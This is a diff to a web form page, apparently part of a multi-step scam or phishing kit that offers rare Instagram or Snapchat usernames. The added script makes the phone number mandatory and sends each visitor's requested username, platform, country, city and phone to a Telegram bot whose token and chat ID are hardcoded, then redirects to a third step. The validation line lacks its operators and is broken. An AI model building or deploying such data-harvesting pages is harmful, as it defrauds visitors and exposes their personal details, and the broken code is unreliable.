@@ -13,6 +13,7 @@
       --text-main: #222222;
       --text-muted: #888888;
       --accent-blue: #0070f3;
+      --accent-green: #17a54d;
     }
 
     * {
@@ -42,22 +43,18 @@
       background: var(--bg-panel);
       border-radius: 18px;
       box-shadow: 0 8px 24px rgba(15, 23, 42, 0.08);
-      padding: 20px 18px 22px;
+      padding: 22px 18px 24px;
     }
 
     .inner-card {
-      margin-top: 6px;
-      padding: 22px 18px 20px;
-      border-radius: 16px;
-      background: var(--bg-inner);
-      border: 1px solid var(--border-light);
+      padding: 6px 2px 0;
     }
 
     h1 {
-      font-size: 20px;
+      font-size: 22px;
       font-weight: 600;
       text-align: center;
-      margin-bottom: 18px;
+      margin-bottom: 20px;
     }
 
     .form-group {
@@ -70,9 +67,9 @@
       margin-bottom: 6px;
     }
 
-    select,
     input[type="text"],
-    input[type="tel"] {
+    input[type="tel"],
+    select {
       width: 100%;
       padding: 10px 11px;
       border-radius: 6px;
@@ -80,17 +77,20 @@
       font-size: 14px;
       outline: none;
       background-color: #ffffff;
-      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease,
+        background-color 0.15s ease;
     }
 
-    select:focus,
-    input:focus {
+    input::placeholder,
+    select:invalid {
+      color: #c0c4cc;
+    }
+
+    input:focus,
+    select:focus {
       border-color: var(--accent-blue);
       box-shadow: 0 0 0 1px rgba(0, 112, 243, 0.18);
-    }
-
-    input::placeholder {
-      color: #c0c4cc;
+      background-color: #ffffff;
     }
 
     .helper {
@@ -125,11 +125,7 @@
 
     @media (max-width: 400px) {
       .panel {
-        padding: 16px 14px 18px;
-      }
-
-      .inner-card {
-        padding: 18px 14px 16px;
+        padding: 18px 14px 20px;
       }
     }
   </style>
@@ -141,6 +137,29 @@
         <h1>More Details</h1>
 
         <form id="step2Form" onsubmit="return false;">
+
+          <!-- اليوزر المطلوب -->
+          <div class="form-group">
+            <label for="wantedUser">Requested username</label>
+            <input
+              id="wantedUser"
+              type="text"
+              placeholder="Example: a7, q_11, 8g8"
+              required
+            />
+          </div>
+
+          <!-- نوع المنصّة -->
+          <div class="form-group">
+            <label for="platform">Platform (Instagram / Snapchat)</label>
+            <input
+              id="platform"
+              type="text"
+              placeholder="Instagram or Snapchat"
+              required
+            />
+          </div>
+
           <!-- Country -->
           <div class="form-group">
             <label for="country">Country</label>
@@ -272,15 +291,16 @@
             />
           </div>
 
-          <!-- Phone (اختياري) -->
+          <!-- Phone (إجباري) -->
           <div class="form-group">
-            <label for="phone">Phone (optional)</label>
+            <label for="phone">Phone</label>
             <input
               id="phone"
               type="tel"
               placeholder="+971 5X XXX XXXX"
+              required
             />
-            <div class="helper">You can leave this empty if you prefer.</div>
+            <div class="helper">This form is required.</div>
           </div>
 
           <button type="submit" class="btn-submit">Next</button>
@@ -290,18 +310,76 @@
   </div>
 
   <script>
-    // مؤقتًا: بس يمنع الريفريش ويطبع القيم في الكونسول
-    document.getElementById("step2Form").addEventListener("submit", function (e) {
+    const form      = document.getElementById("step2Form");
+    const countryEl = document.getElementById("country");
+    const phoneEl   = document.getElementById("phone");
+
+    // أكواد دول أساسية للـ placeholder
+    const phoneCodes = {
+      "United Arab Emirates": "+971",
+      "Saudi Arabia": "+966",
+      "Qatar": "+974",
+      "Kuwait": "+965",
+      "Bahrain": "+973",
+      "Oman": "+968",
+      "Jordan": "+962",
+      "Turkey": "+90",
+      "United States": "+1",
+      "United Kingdom": "+44"
+    };
+
+    // تغيير الشكل حسب الدولة
+    countryEl.addEventListener("change", () => {
+      const c = countryEl.value;
+      const code = phoneCodes[c] || "+";
+      phoneEl.placeholder = code + " 5X XXX XXXX";
+    });
+
+    form.addEventListener("submit", function (e) {
       e.preventDefault();
 
-      const country = document.getElementById("country").value;
-      const city    = document.getElementById("city").value.trim();
-      const phone   = document.getElementById("phone").value.trim();
+      const wantedUser = document.getElementById("wantedUser").value.trim();
+      const platform   = document.getElementById("platform").value.trim();
+      const country    = countryEl.value;
+      const city       = document.getElementById("city").value.trim();
+      const phone      = phoneEl.value.trim();
 
-      console.log("Step 2 data:", { country, city, phone });
+      // تحقق يدوي – لو في شي ناقص
+      if (!wantedUser  !platform  !country  !city  !phone) {
+        alert("This form is required");
+        return;
+      }
 
-      // لاحقاً نربطها بالتليجرام أو صفحة ثالثة
-      alert("Details received. You can close this page now.");
+      const message =
+        "🔔 New submission - STEP 2\n" +
+        "-----------------------\n" +
+        "👤 Requested username: " + wantedUser + "\n" +
+        "📱 Platform: " + platform + "\n" +
+        "🌍 Country: " + country + "\n" +
+        "🏙 City: " + city + "\n" +
+        "📞 Phone: " + phone;
+
+      const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
+      const chatId   = "7811430582";
+
+      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Telegram response:", data);
+        // بعد الإرسال الناجح ↩
+        window.location.href = "step3.html"; // اعمل ملف step3.html لاحقاً
+      })
+      .catch(error => {
+        console.error("Telegram error:", error);
+        alert("Something went wrong. Try again.");
+      });
     });
   </script>
 </body>
